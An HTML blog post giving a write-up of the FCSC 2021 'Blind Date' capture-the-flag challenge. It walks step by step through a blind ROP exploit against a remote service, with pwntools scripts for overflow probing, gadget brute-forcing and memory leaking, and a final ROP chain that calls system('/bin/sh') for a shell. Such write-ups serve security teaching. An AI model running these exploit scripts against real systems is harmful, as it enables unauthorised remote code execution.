<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title> FCSC 2021 - Blind Date - Slowerzs&#39; blog </title>
    <meta name="HandheldFriendly" content="True">
    <meta name="MobileOptimized" content="320">
    <meta name="referrer" content="no-referrer">
    <meta name="description" content="" />
    <meta property="og:site_name" content="Slowerzs&#39; blog" />
    <meta property="og:locale" content="en_US" />
    <meta property="og:type" content="article" />
    <meta property="og:url" content="https://blog.slowerzs.net/archive/fcsc-2021-blind-date/" />
    <meta property="og:title" content="FCSC 2021 - Blind Date" />
    <meta property="og:image" content="https://blog.slowerzs.net/images/small-favicon.png" />
    <meta property="og:description" content="" />

    <meta name="twitter:card" content=" summary_large_image" />
    
    <meta name="twitter:title" content="FCSC 2021 - Blind Date" />
    <meta name="twitter:description" content="" />
    <meta name="twitter:image" content="https://blog.slowerzs.net/images/small-favicon.png" />

    <link rel="canonical" href="https://blog.slowerzs.net/archive/fcsc-2021-blind-date/">

    <link rel="stylesheet" href="https://blog.slowerzs.net/css/bootstrap.min.css" />

    <link rel="stylesheet" href="https://blog.slowerzs.net/css/custom.css" />

    
    <link rel="stylesheet" id="light-css" href="https://blog.slowerzs.net/css/stackoverflow-light.min.css" media="screen">
    <link rel="stylesheet" id="dark-css" href="https://blog.slowerzs.net/css/stackoverflow-dark.min.css" media="screen">
    

    <link rel="shortcut icon"
        href="https://blog.slowerzs.net/images/favicon.png?">

</head>

<body>
    <script>

        window.addEventListener('load', function () {
            hljs.configure({
                ignoreUnescapedHTML: true
            })
            hljs.highlightAll();
        }, true);

        let darkTheme = localStorage.getItem("darkTheme")
        if (darkTheme === null) {
            if (window.matchMedia("(prefers-color-scheme: dark)").matches) {
                document.documentElement.setAttribute('data-theme', 'dark');
                localStorage.setItem("darkTheme", true);
                document.getElementById("light-css").setAttribute('disabled', 'true')
                document.getElementById("dark-css").removeAttribute('disabled')
            } else {
                document.documentElement.setAttribute('data-theme', 'light');
                localStorage.setItem("darkTheme", false);
                document.getElementById("dark-css").setAttribute('disabled', 'true')
                document.getElementById("light-css").removeAttribute('disabled')
            }
        } else if (darkTheme === "true") {
            document.documentElement.setAttribute('data-theme', 'dark');
            document.getElementById("light-css").setAttribute('disabled', 'true')
            document.getElementById("dark-css").removeAttribute('disabled')
        } else {
            document.documentElement.setAttribute('data-theme', 'light');
            document.getElementById("dark-css").setAttribute('disabled', 'true')
            document.getElementById("light-css").removeAttribute('disabled')
        }

        function switchTheme() {
            let darkTheme = localStorage.getItem("darkTheme");
            if (darkTheme === null) {
                darkTheme = window.matchMedia("(prefers-color-scheme: dark)").matches.toString()
            }

            if (darkTheme === "true") {
                document.documentElement.setAttribute('data-theme', 'light');
                localStorage.setItem("darkTheme", false);
                document.getElementById("dark-css").setAttribute('disabled', 'true')
                document.getElementById("light-css").removeAttribute('disabled')
            } else {
                document.documentElement.setAttribute('data-theme', 'dark');
                localStorage.setItem("darkTheme", true);
                document.getElementById("light-css").setAttribute('disabled', 'true')
                document.getElementById("dark-css").removeAttribute('disabled')
            }

        }
    </script>
    
    <div class="mt-xl header">
    <div class="container">
        <div>
            <div class="row justify-content-center">
                <div class="row">
                    <a href="https://blog.slowerzs.net/">
                        <h1 class="name">Slowerzs&#39; blog</h1>
                    </a>
                    <img id="switcher" onclick="switchTheme()" src="https://blog.slowerzs.net/images/theme-dark.svg" height="32px" width="32px"
                        style="position: absolute; left: 93%; transform: translateX(-93%);" />
                </div>
            </div>

            <div class="row justify-content-center">
                <ul class="nav nav-primary">
                    
                    <li class="nav-item">
                        <a class="nav-link" href="https://blog.slowerzs.net/">
                            
                            Home
                        </a>
                    </li>
                    
                    <li class="nav-item">
                        <a class="nav-link" href="https://github.com/Slowerzs">
                            
                            Github
                        </a>
                    </li>
                    
                    <li class="nav-item">
                        <a class="nav-link" href="https://twitter.com/slowerzs">
                            
                            Twitter
                        </a>
                    </li>
                    
                    <li class="nav-item">
                        <a class="nav-link" href="https://blog.slowerzs.net/archive">
                            
                            Archive
                        </a>
                    </li>
                    
                </ul>
            </div>

        </div>
    </div>
</div>

    <div class="content">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-sm-12 col-lg-8">
                    <h1 class="mx-0 mx-md-4">FCSC 2021 - Blind Date</h1>
                    <div class="markdown">
                        
    <h2 id="blind-date">Blind Date</h2>
<p>This challenge was part of the Pwn category, and was worth 500 points. Given the challenge name, and the fact that no binary is given, we expect this challenge to be some sort of blind rop challenge.
The description of the challenge just gives us a hostname and a port</p>
<blockquote>
<p>Une société souhaite créer un service en ligne protégeant les informations de ses clients. Pouvez-vous leur montrer qu&rsquo;elle n&rsquo;est pas sûre en lisant le fichier flag.txt sur leur serveur ? Les gérants de cette société n&rsquo;ont pas souhaité vous donner ni le code source de leur solution, ni le binaire compilé, mais ils vous proposent uniquement un accès distant à leur service.</p>
</blockquote>
<blockquote>
<p>nc challenges2.france-cybersecurity-challenge.fr 4008</p>
</blockquote>
<h2 id="step-one--the-overflow">Step one : the overflow</h2>
<p>To begin with this challenge, we start by interacting with the remote service. It simply asks for a input, thanks us, says bye and exits.</p>
<pre tabindex="0"><code class="language-nc" data-lang="nc">Hello you.
What is your name ?
&gt;&gt;&gt; bob
Thanks bob
Bye!
</code></pre><p>However, if we were to send a bigger input, the program would not send any data back.</p>
<pre tabindex="0"><code class="language-nc" data-lang="nc">Hello you.
What is your name ?
&gt;&gt;&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</code></pre><p>By adjusting the size of the input, we figure out that more than 40 characters results in no data being sent back. We can infer from this behaviour that the program has crashed, because we overwrote something. We will assume this is a stack value.</p>
<p>Next, we try to figure what is the value that we overwrote.
In the case of blind rops, there are two possible situations for us to exploit : either the programs has a stack canary, but it forks itself upon receiving a connexion, which makes the stack canary the same each time, or, as is the case in this challenge, it simply does not have a canary !
Thus, to find out what the overwritten value is, we will simply send exactly 40 bytes of random data, plus one byte of data. If the program does send us the epilogue (&ldquo;Bye!&rdquo;), we know that the extra byte is the one that was previously on the stack. If it does not send the epilogue back, we simply try another byte.</p>
<p>To do, I wrote a simple python script using the pwntools library</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#00f">from</span> pwn <span style="color:#00f">import</span> *                                                                                                                           
</span></span><span style="display:flex;"><span>context.log_level=<span style="color:#a31515">&#34;error&#34;</span>                                                                                                                  
</span></span><span style="display:flex;"><span>                                                                                                                                            
</span></span><span style="display:flex;"><span>                                                                                                                                            
</span></span><span style="display:flex;"><span>host = <span style="color:#a31515">&#34;challenges2.france-cybersecurity-challenge.fr&#34;</span>                                                                                      
</span></span><span style="display:flex;"><span>port = 4008
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> find_data(prev=<span style="color:#a31515">b</span><span style="color:#a31515">&#34;&#34;</span>):
</span></span><span style="display:flex;"><span>	found = <span style="color:#a31515">b</span><span style="color:#a31515">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#00f">for</span> _ <span style="color:#00f">in</span> range(8):
</span></span><span style="display:flex;"><span>		<span style="color:#00f">for</span> i <span style="color:#00f">in</span> range(256):
</span></span><span style="display:flex;"><span>			payload = <span style="color:#a31515">b</span><span style="color:#a31515">&#34;a&#34;</span>*40 + prev + found + bytes([i])
</span></span><span style="display:flex;"><span>			p = remote(host, port)
</span></span><span style="display:flex;"><span>			p.recvuntil(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>			p.send(payload)
</span></span><span style="display:flex;"><span>			<span style="color:#00f">try</span>:
</span></span><span style="display:flex;"><span>				data = p.recv()
</span></span><span style="display:flex;"><span>			<span style="color:#00f">except</span>:
</span></span><span style="display:flex;"><span>				p.close()
</span></span><span style="display:flex;"><span>				<span style="color:#00f">continue</span>
</span></span><span style="display:flex;"><span>			p.close()
</span></span><span style="display:flex;"><span>			<span style="color:#00f">if</span> <span style="color:#a31515">b</span><span style="color:#a31515">&#34;Bye&#34;</span> <span style="color:#00f">in</span> data:
</span></span><span style="display:flex;"><span>				<span style="color:#008000">#We found a correct byte!</span>
</span></span><span style="display:flex;"><span>				found = found + bytes([i])	
</span></span><span style="display:flex;"><span>				<span style="color:#00f">break</span>
</span></span><span style="display:flex;"><span>	<span style="color:#00f">return</span> found
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>value1 = find_data()
</span></span><span style="display:flex;"><span>value2 = find_data(value1)
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#a31515">b</span><span style="color:#a31515">&#34;Value 1 : &#34;</span> + value1)
</span></span><span style="display:flex;"><span>print(<span style="color:#a31515">b</span><span style="color:#a31515">&#34;Value 2 : &#34;</span> + value2)
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>This only gives one meaningful value, of 8 bytes : <code>0x00000000004006cc</code>
The following ones are 0x0</p>
<h2 id="step-two--the-gadgets">Step Two : the gadgets</h2>
<p>This value gives us a lot of useful information : this looks like an address of the .text of a 64-bits ELF compiled without PIE (slightly after 0x400000 - the base for 64-bits ELF without PIE).
From this, we can conclude that the original value on the stack vas the return address of some function, there is no saved rbp on the stack.</p>
<p>We can use this to build a ropchain to get a shell on the server.</p>
<p>For this, we will need gadgets, that let us control registers that are used as arguments for function. And to do this, we need to know the address of those gadgets, and to do so we need to know if the execution crashed of not.</p>
<h3 id="the-stop-gadget">The stop gadget</h3>
<p>To check if the execution crashed, we will use a &ldquo;stop gadget&rdquo;, a gadget that sends us back some fixed data - any data.
We will insert this gadget at the end of our ropchain, this way, if the &ldquo;magic&rdquo; data is sent back, we know that the ropchain executed properly, else, it failed.</p>
<p>To find this gadget, we will simply try addresses after the base of the <code>.text</code>, and check what the data sent back to us (if any).</p>
<p>The stop gadget I ended up using was at 0x400560, and sent &ldquo;Hello you&rdquo; a second time.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>&gt;&gt;&gt; payload = <span style="color:#a31515">b</span><span style="color:#a31515">&#34;a&#34;</span>*40 + p64(0x400560)
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; p.send(payload)
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; p.recv()
</span></span><span style="display:flex;"><span><span style="color:#a31515">b</span><span style="color:#a31515">&#39;Hello you.</span><span style="color:#a31515">\n</span><span style="color:#a31515">What is your name ?</span><span style="color:#a31515">\n</span><span style="color:#a31515">&gt;&gt;&gt; Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`</span><span style="color:#a31515">\x05</span><span style="color:#a31515">@Hello you.</span><span style="color:#a31515">\n</span><span style="color:#a31515">What is your name ?</span><span style="color:#a31515">\n</span><span style="color:#a31515">&gt;&gt;&gt; &#39;</span>
</span></span></code></pre></div><h3 id="the-register-gadgets">The register gadgets</h3>
<p>Next, we will need to find a way to leak some data from the binary. And to do so, we must be able to control argument register, at least <code>rdi</code> and <code>rsi</code>, <code>rdx</code> would be a bonus if we need to call a function with 3+ arguments.</p>
<p>There is a well-known gadget to controle <code>rdi</code> and <code>rsi</code> : it is located in the epilogue of <code>__libc_csu_init</code>
From experience, I know the function ends like this :</p>
<pre tabindex="0"><code>5b             pop rbx
5d             pop rbp
415c           pop r12
415d           pop r13
415e           pop r14
415f           pop r15
c3             ret
</code></pre><p>How does this help us control <code>rdi</code> and <code>rsi</code> ? Well, if we disassemble only the last 2 bytes, we get <code>5fc3</code>, which is <code>pop rdi; ret</code>. Perfect !
For <code>rsi</code>, if we take the last 4 bytes of this function, we get <code>5e415fc3</code>, which is <code>pop rsi; pop r15; ret</code>. We will have to fill a value in <code>r15</code>, but that is fine.</p>
<p>Now, we need to find this gadget. We will use the same method as for the stop gadget, except that after the candidat address, we will add 6 8-bytes long value to fill the registers, and the stop gadget.
If we find our magic &ldquo;Hello you&rdquo; in the answer, we found it !</p>
<p>Again, using pwntools :</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#00f">from</span> pwn <span style="color:#00f">import</span> *                                                                                                                           
</span></span><span style="display:flex;"><span>context.log_level=<span style="color:#a31515">&#34;error&#34;</span>                                                                                                                  
</span></span><span style="display:flex;"><span>                                                                                                                                            
</span></span><span style="display:flex;"><span>                                                                                                                                            
</span></span><span style="display:flex;"><span>host = <span style="color:#a31515">&#34;challenges2.france-cybersecurity-challenge.fr&#34;</span>                                                                                      
</span></span><span style="display:flex;"><span>port = 4008
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>stop_gadget = 0x400560
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#00f">for</span> i <span style="color:#00f">in</span> range(0x400000, 0x400000 + 0x2000):
</span></span><span style="display:flex;"><span>	payload = <span style="color:#a31515">b</span><span style="color:#a31515">&#39;a&#39;</span> * 40 + p64(i) + p64(0x1234)*6 + p64(stop_gadget)
</span></span><span style="display:flex;"><span>	p = remote(host, port)
</span></span><span style="display:flex;"><span>	p.recvuntil(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>	p.send(payload)
</span></span><span style="display:flex;"><span>	<span style="color:#00f">try</span>:
</span></span><span style="display:flex;"><span>		data = p.recv()
</span></span><span style="display:flex;"><span>	<span style="color:#00f">except</span>:
</span></span><span style="display:flex;"><span>		p.close()
</span></span><span style="display:flex;"><span>		<span style="color:#00f">continue</span>
</span></span><span style="display:flex;"><span>	p.close()
</span></span><span style="display:flex;"><span>	<span style="color:#00f">if</span> <span style="color:#a31515">b</span><span style="color:#a31515">&#34;Hello&#34;</span> <span style="color:#00f">in</span> data:
</span></span><span style="display:flex;"><span>		print(<span style="color:#a31515">&#34;Found at : &#34;</span> + hex(i))
</span></span><span style="display:flex;"><span>		<span style="color:#00f">break</span>
</span></span></code></pre></div><p>This outputs only one result : at <code>0x40073a</code>. Therefore, <code>pop rdi; ret</code> is at <code>0x400743</code> and <code>pop rsi; pop r15; ret</code> at <code>0x400741</code>
What about <code>rdx</code> ? There is a technique - namely, ret2csu_init - which could help us in controlling <code>rdx</code>, but we won&rsquo;t need it for this challenge, so I have taken the lazy approach :p</p>
<h3 id="leaking-data">Leaking data</h3>
<p>Now, we have all we need to leak data. One option, would be to directly use the <code>send</code> function located in the <code>.plt</code> section. However, we need to have the third argument (the length of the data to send) to a value &gt; 0.
However, after trying, I could not find any address that sent a fixed amount of data, so I assumed rdx = 0.</p>
<p>While trying to check the previous idea, I found some interesting addresses</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#00f">from</span> pwn <span style="color:#00f">import</span> *                                                                                                                           
</span></span><span style="display:flex;"><span>context.log_level=<span style="color:#a31515">&#34;error&#34;</span>                                                                                                                  
</span></span><span style="display:flex;"><span>                                                                                                                                            
</span></span><span style="display:flex;"><span>                                                                                                                                            
</span></span><span style="display:flex;"><span>host = <span style="color:#a31515">&#34;challenges2.france-cybersecurity-challenge.fr&#34;</span>                                                                                      
</span></span><span style="display:flex;"><span>port = 4008
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rsi_r15 = 0x400741
</span></span><span style="display:flex;"><span>pop_rdi = 0x400743
</span></span><span style="display:flex;"><span>stop_gadget = 0x400560
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#00f">for</span> i <span style="color:#00f">in</span> range(0x400000, 0x400000 + 0x2000):
</span></span><span style="display:flex;"><span>	payload = <span style="color:#a31515">b</span><span style="color:#a31515">&#39;a&#39;</span>*40 + p64(pop_rsi_r15) + p64(4) + p64(0) + p64(pop_rdi) + p64(0x400000) + p64(i) + p64(stop_gadget)
</span></span><span style="display:flex;"><span>	<span style="color:#008000">#Here, we set rsi to 4, this is the number of the fd of our connexion; and rdi to 0x400000, the address we want to leak - the base of the binary, and we expect to have b&#34;\x7fELF&#34; in the answer</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	p = remote(host, port)
</span></span><span style="display:flex;"><span>	p.recvuntil(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>	p.send(payload)
</span></span><span style="display:flex;"><span>	<span style="color:#00f">try</span>:
</span></span><span style="display:flex;"><span>		data = p.recv()
</span></span><span style="display:flex;"><span>	<span style="color:#00f">except</span>:
</span></span><span style="display:flex;"><span>		p.close()
</span></span><span style="display:flex;"><span>		<span style="color:#00f">continue</span>
</span></span><span style="display:flex;"><span>	p.close()
</span></span><span style="display:flex;"><span>	<span style="color:#00f">if</span> <span style="color:#a31515">b</span><span style="color:#a31515">&#34;</span><span style="color:#a31515">\x7f</span><span style="color:#a31515">ELF&#34;</span> <span style="color:#00f">in</span> data:
</span></span><span style="display:flex;"><span>		print(<span style="color:#a31515">b</span><span style="color:#a31515">&#34;Found at : &#34;</span> + hex(i).encode() + <span style="color:#a31515">b</span><span style="color:#a31515">&#34; -&gt; &#34;</span> + data)
</span></span><span style="display:flex;"><span>		<span style="color:#00f">break</span>
</span></span></code></pre></div><p>At the address <code>0x4004f5</code> we get the following data back :</p>
<pre tabindex="0"><code class="language-raw" data-lang="raw">Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaA\x07@\x7fELF\x02\x01\x01\nHello you.\nWhat is your name ?\n&gt;&gt;&gt;
</code></pre><p>Great ! We have a way to leak data. This is most likely the adresse of a function that only takes a file descriptor and an address and sends data at the address back.
How much data exactly ? By adjusting the address of the leaked data, we can observe that sometimes there is no data back, and there are no null bytes. We can infer that the program uses strlen or something similar to determine how much data is sent. So, if there is no data back, we can conclude that there is at least one null byte ! We can leak anything now !</p>
<h3 id="leaking-the-binary">Leaking the binary</h3>
<p>Thinking next, what do we need for our ropchain ? We want to be able to call dup2(4,0), dup2(4,1) and then system(&quot;/bin/sh&quot;) to be able get a shell with input/output. For that, we need to know the libc and the base address of the libc.
Let&rsquo;s try the easy way first : for that, with our arbitrary read, we will leak the values in the <code>.got.plt</code> section, and try to identify the libc using online database. For that, we need to locate the <code>.got.plt</code> section.</p>
<p>The <code>.got.plt</code> can be quite far from the base of the ELF depending on the binary, so let&rsquo;s be efficient. For this, I have dumped the first 0x1000 starting at the base of the ELF.</p>
<p>Here are the interesting parts :</p>
<pre tabindex="0"><code>00000370: 1010 6000 0000 0000 0800 0000 0000 0000  ..`.............                                                                         
00000380: 006c 6962 632e 736f 2e36 0066 666c 7573  .libc.so.6.fflus                                                                         
00000390: 6800 7075 7473 0070 7269 6e74 6600 7265  h.puts.printf.re                                                                         
000003a0: 6164 0073 7464 6f75 7400 5f5f 6c69 6263  ad.stdout.__libc                                                                         
000003b0: 5f73 7461 7274 5f6d 6169 6e00 5f5f 676d  _start_main.__gm                                                                         
000003c0: 6f6e 5f73 7461 7274 5f5f 0047 4c49 4243  on_start__.GLIBC                                                                         
000003d0: 5f32 2e32 2e35 0000 0000 0200 0200 0200  _2.2.5..........
...
00000000: ff35 c20a 2000 ff25 c40a 2000 0f1f 4000  .5.. ..%.. ...@.
00000500: ff25 c20a 2000 6800 0000 00e9 e0ff ffff  .%.. .h.........
00000510: ff25 ba0a 2000 6801 0000 00e9 d0ff ffff  .%.. .h.........
00000520: ff25 b20a 2000 6802 0000 00e9 c0ff ffff  .%.. .h.........
00000530: ff25 aa0a 2000 6803 0000 00e9 b0ff ffff  .%.. .h.........
00000540: ff25 a20a 2000 6804 0000 00e9 a0ff ffff  .%.. .h.........
00000550: ff25 9a0a 2000 6805 0000 00e9 90ff ffff  .%.. .h.........
</code></pre><p>What is this ? This is the <code>.plt</code> section : if we disassemble the 16 bytes at <code>0x400500</code> for instance, we get this :</p>
<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">ff25c20a2000       jmp    QWORD PTR [rip+0x200ac2]
6800000000         push   0x0
e9e0ffffff         jmp    0xfffffffffffffff0
</code></pre><p>It indicates where the <code>.got.plt</code> section is. With this, we can leak the address in the libc of the puts function (there is one entry just before in the <code>.plt</code> - and puts is the second entry according to data at 0x380).
Given that this is at address <code>0x400500</code>, we can conclude that the <code>.got.plt</code> entry for puts is at <code>0x600fc8</code></p>
<p>If we leak 8 bytes there, we get an address starting with 0x7f - a libc address ! But if we do so multiple times, we get different addresses. This is because ASLR is enabled on the machine, and so we know the program does not fork itself.
Even if ASLR is enabled, the last 3 nibbles of the leaked address are constant, and with this, we can identify the libc. In this case, the fflush address ends in <code>0x990</code>. Using online websites, we identify this libc as being <code>libc6_2.19-18+deb8u10_amd64</code></p>
<h3 id="the-ropchain">The ropchain</h3>
<p>Now, we have all we need to build the final ropchain !
What we do is leak the libc, and start the execution again without restarting : for this, the stop gadget will do fine since it asked for input again. Then, we trigger the overflow again and execute dup2 and system</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#00f">from</span> pwn <span style="color:#00f">import</span> *                                                                                                                           
</span></span><span style="display:flex;"><span>context.log_level=<span style="color:#a31515">&#34;error&#34;</span>                                                                                                                  
</span></span><span style="display:flex;"><span>                                                                                                                                            
</span></span><span style="display:flex;"><span>                                                                                                                                            
</span></span><span style="display:flex;"><span>host = <span style="color:#a31515">&#34;challenges2.france-cybersecurity-challenge.fr&#34;</span>                                                                                      
</span></span><span style="display:flex;"><span>port = 4008
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>fnc_leak = 0x4004f5
</span></span><span style="display:flex;"><span>pop_rsi_r15 = 0x400741
</span></span><span style="display:flex;"><span>pop_rdi = 0x400743
</span></span><span style="display:flex;"><span>stop_gadget = 0x400560
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc = ELF(<span style="color:#a31515">&#34;./libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p = remote(host, port)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> leak(addr):                                                                                                                             
</span></span><span style="display:flex;"><span>        payload = <span style="color:#a31515">b</span><span style="color:#a31515">&#39;a&#39;</span>*40 + p64(pop_rsi_r15) + p64(4) + p64(0) + p64(pop_rdi) + p64(addr) + p64(fnc_leak) + p64(stop_gadget) 
</span></span><span style="display:flex;"><span>        p.recv()                                                                                                                            
</span></span><span style="display:flex;"><span>        p.send(payload)                                                                                                                     
</span></span><span style="display:flex;"><span>        p.recvuntil(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;@&#39;</span>)                                                                                                                   
</span></span><span style="display:flex;"><span>        data = p.recvuntil(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;Hello&#39;</span>)[:-6]                                                                                                   
</span></span><span style="display:flex;"><span>        <span style="color:#00f">if</span> data == <span style="color:#a31515">b</span><span style="color:#a31515">&#39;&#39;</span>:                                                                                                                     
</span></span><span style="display:flex;"><span>                data = <span style="color:#a31515">b</span><span style="color:#a31515">&#39;</span><span style="color:#a31515">\x00</span><span style="color:#a31515">&#39;</span>                                                                                                              
</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> data                                                                                                                         
</span></span><span style="display:flex;"><span>                                                                                                                                            
</span></span><span style="display:flex;"><span>i = 0x8                                                                                                                                     
</span></span><span style="display:flex;"><span>j = 0                                                                                                                                       
</span></span><span style="display:flex;"><span>                                                                                                                                            
</span></span><span style="display:flex;"><span>got_entry = 0x600fc8                                                                                                                        
</span></span><span style="display:flex;"><span>data = <span style="color:#a31515">b</span><span style="color:#a31515">&#34;&#34;</span>                                                                                                                                  
</span></span><span style="display:flex;"><span>                                                                                                                                            
</span></span><span style="display:flex;"><span><span style="color:#00f">while</span> i &gt; 0:                                                                                                                                
</span></span><span style="display:flex;"><span>        data_temp = leak(0x600fc8 + j)                                                                                                 
</span></span><span style="display:flex;"><span>        data += data_temp                                                                                                                   
</span></span><span style="display:flex;"><span>        i -= len(data_temp)                                                                                                                 
</span></span><span style="display:flex;"><span>        j += len(data_temp)                                                                                                                 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc_leak = u64(data)
</span></span><span style="display:flex;"><span>libc_base = libc_leak - libc.symbols[<span style="color:#a31515">&#34;puts&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>str_sh = next(libc.search(<span style="color:#a31515">b</span><span style="color:#a31515">&#34;/bin/sh</span><span style="color:#a31515">\x00</span><span style="color:#a31515">&#34;</span>)) + libc_base
</span></span><span style="display:flex;"><span>system = libc.symbols[<span style="color:#a31515">&#34;system&#34;</span>] + libc_base
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload = <span style="color:#a31515">b</span><span style="color:#a31515">&#39;a&#39;</span>*40 + p64(pop_rdi) + p64(str_sh) + p64(system)
</span></span><span style="display:flex;"><span><span style="color:#008000">#We don&#39;t even need dup2!</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>p.send(payload)
</span></span><span style="display:flex;"><span>p.interactive()
</span></span></code></pre></div><p>With this, we get a shell !</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 exploit.py
</span></span><span style="display:flex;"><span>[*] <span style="color:#a31515">&#39;/root/FCSC/pwn/Blind/libc.so.6&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span><span style="display:flex;"><span>[*] Switching to interactive mode
</span></span><span style="display:flex;"><span>$ id
</span></span><span style="display:flex;"><span>uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
</span></span></code></pre></div><p>And the flag : <code>FCSC{3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28}</code></p>
<h2 id="conclusion">Conclusion</h2>
<p>This was a fun challenge, a classic blind rop with a little twist of ASLR + no fork, making it very enjoyable :)
The challenge could have been made harder by using a hard to find libc, in which case the <code>DynELF</code> python library would have come in handy, but I chose the manual approch for this challenge.</p>



                    </div>
                </div>
            </div>
        </div>
    </div>

    


    

    
    <script src="https://blog.slowerzs.net/js/highlight.min.js"></script>
    
    
    <script src="https://blog.slowerzs.net/js/python.min.js"></script>
    
    <script src="https://blog.slowerzs.net/js/c.min.js"></script>
    
    <script src="https://blog.slowerzs.net/js/x86asm.min.js"></script>
    
    <script src="https://blog.slowerzs.net/js/armasm.min.js"></script>
    
    <script src="https://blog.slowerzs.net/js/bash.min.js"></script>
    
    <script src="https://blog.slowerzs.net/js/shell.min.js"></script>
    
    <script src="https://blog.slowerzs.net/js/csharp.min.js"></script>
    
    

    <div id="modal" class="modal">
        <img id="modal-content" class="modal-content">
    </div>
    <script>

        if (typeof screen.orientation !== 'undefined') {
            
            var modal = document.getElementById('modal');

            modal.addEventListener('click', function (e) {
                if (e.target === e.currentTarget) {
                    modal.style.display = "none";
                    document.body.style.overflowY = "visible"
                }
            });
            document.addEventListener('keydown', function (e) {
                if (e.key === "Escape") {
                    modal.style.display = "none";
                    document.body.style.overflowY = "visible"
                }
            })

            document.addEventListener('click', function (e) {
                if (e.target.parentElement.parentElement.className.indexOf('figure') !== -1) {
                    var img = e.target;
                    var modalImg = document.getElementById("modal-content");
                    document.body.style.overflowY = "hidden"
                    modal.style.display = "flex";
                    modalImg.src = img.src;
                }
            });

        }


    </script>

    

</body>

</html>